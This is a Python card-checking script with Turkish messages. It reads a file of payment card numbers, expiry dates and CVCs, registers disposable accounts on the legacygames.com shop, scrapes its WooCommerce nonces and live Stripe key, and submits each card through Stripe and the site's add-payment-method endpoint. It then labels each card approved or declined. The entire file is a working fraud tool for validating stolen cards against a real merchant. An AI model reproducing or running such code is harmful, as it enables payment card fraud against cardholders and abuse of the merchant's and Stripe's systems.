import requests as r
import re
import random
import time

xx = input('combo gir: ')
try:
    file = open(f'{xx}', "r")
except FileNotFoundError:
    print(f"Hata: '{xx}' adında dosya bulunamadı.")
    exit()

start_num = 0
for P in file.readlines():
    start_num += 1
    
    n = P.split('|')[0]
    bin3=n[:6]
    mm=P.split('|')[1]
    if int(mm) < 10 and '0' not in mm:
        mm = f'0{mm}'
    
    yy=P.split('|')[2]
    if len(yy) == 2:
        yy = f'20{yy}'
    
    cvc=P.split('|')[3].replace('\n', '').strip()
    P=P.replace('\n', '')

    user = (f"user{random.randint(1000, 9999)}{start_num}")
    email = user + "@gmail.com"
    
    s = r.Session() 
    
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
    }
    
    html_response = s.get('https://legacygames.com/my-account/add-payment-method/', headers=headers)
    
    reg_match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', html_response.text)
    if reg_match:
        reg = reg_match.group(1)
    else:
        print("HATA: Register Nonce (reg) bulunamadı. Bu isteği atlıyorum.")
        continue
        
    pk_live_match = re.search(r'pk_live_[a-zA-Z0-9]+', html_response.text)
    if pk_live_match:
        pk_live = pk_live_match.group(0)
    else:
        print("HATA: pk_live bulunamadı. Bu isteği atlıyorum.")
        continue
        
    data = {
        'username': user,
        'email': email,
        'password': 'qeqweqweqwqw12312@',
        'promo_referral_name': '',
        'wc_order_attribution_source_type': 'typein',
        'wc_order_attribution_referrer': '(none)',
        'wc_order_attribution_utm_campaign': '(none)',
        'wc_order_attribution_utm_source': '(direct)',
        'wc_order_attribution_utm_medium': '(none)',
        'wc_order_attribution_utm_content': '(none)',
        'wc_order_attribution_utm_id': '(none)',
        'wc_order_attribution_utm_term': '(none)',
        'wc_order_attribution_utm_source_platform': '(none)',
        'wc_order_attribution_utm_creative_format': '(none)',
        'wc_order_attribution_utm_marketing_tactic': '(none)',
        'wc_order_attribution_session_entry': 'https://legacygames.com/',
        'wc_order_attribution_session_start_time': '2025-10-16 11:55:34',
        'wc_order_attribution_session_pages': '17',
        'wc_order_attribution_session_count': '1',
        'wc_order_attribution_user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
        'woocommerce-register-nonce': reg,
        '_wp_http_referer': '/my-account/',
        'register': 'Register',
    }

    register_response = s.post('https://legacygames.com/my-account/', headers=headers, data=data)
    
    if 'hesabınız zaten kayıtlı' in register_response.text or register_response.status_code != 200:
        pass

    html2 = s.get('https://legacygames.com/my-account/add-payment-method/', headers=headers).text
    
    addnonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', html2)
    if addnonce_match:
        addnonce = addnonce_match.group(1)
    else:
        print("HATA: Add Payment Nonce (addnonce) bulunamadı. Bu isteği atlıyorum.")
        continue
        
    data_stripe = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=TR&payment_user_agent=stripe.js%2F3eb96675be%3B+stripe-js-v3%2F3eb96675be%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Flegacygames.com&time_on_page=13706&client_attribution_metadata[client_session_id]=758e76a9-5fda-4c8f-ab58-3d338b594899&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=49ba8458-1fd3-4bde-b85d-30d98c7cef9a&guid=aa7c8346-057c-4871-b817-d2082e3842d790f3af&muid=915ccdf6-9a1e-4b46-b7bf-84213dd8f2e84af545&sid=a2210aa1-6aaf-4e1d-b733-a78f5af25f8605fd5c&key={pk_live}'

    response_stripe = s.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data_stripe)
    
    try:
        pm = response_stripe.json()['id']
    except (KeyError, ValueError):
        print("Stripe Yanıtı: ", response_stripe.json().get('error', {}).get('message', 'Bilinmeyen Stripe Hatası'))
        continue

    data_setup_intent = {
        'action': 'wc_stripe_create_and_confirm_setup_intent',
        'wc-stripe-payment-method': pm,
        'wc-stripe-payment-type': 'card',
        '_ajax_nonce': addnonce,
    }

    response_final = s.post('https://legacygames.com/wp-admin/admin-ajax.php', headers=headers, data=data_setup_intent)
    res = response_final.text
    if '"success":true' in res or '"success":True' in res:
        print(f"1000: APPROVED✅ : {P}")
    elif 'succeded' in res:
        print(f"1000: APPROVED✅ : {P}")
    elif '"success":false' in res or '"success":False' in res:
        if 'Your card\'s expiration year is invalid.' in res:
            print(f"DECLINED❌ : {P} | Expired Card")
        elif 'Your card\'s expiration month is invalid.' in res:
            print(f"DECLINED❌ : {P} | Expired Card")
        elif 'Your card number is incorrect.' in res:
            print(f"DECLINED❌ : {P} | Incorrect Number")
        elif 'Your card\'s security code is incorrect.' in res:
            print(f"DECLINED❌ : {P} | Incorrect CVC")
        elif 'Your card was declined.' in res:
            print(f"DECLINED❌ : {P} | Card Declined")
        else:
            print(f"DECLINED❌ : {P} | {res}")